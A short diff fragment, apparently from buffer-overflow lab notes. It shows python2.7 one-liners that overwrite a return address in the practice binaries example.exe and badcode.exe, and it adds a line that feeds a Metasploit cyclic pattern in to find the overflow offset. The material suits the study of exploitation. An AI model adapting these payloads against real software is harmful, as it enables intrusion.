@@ -120,3 +120,6 @@ python2.7 -c "print('A'*72+'\x36\x11\x40\x00\x00\x00\x00\x00')" | ./example.exe
 Note this can also be run inside gdb.
 
 python2.7 -c "print('A'*72 + '\x9d\x11\x00\x00\x00\x00\x00\x00')" | ./badcode.exe
+
+./badcode.exe <<< $(msf-pattern_create -l 100)
+
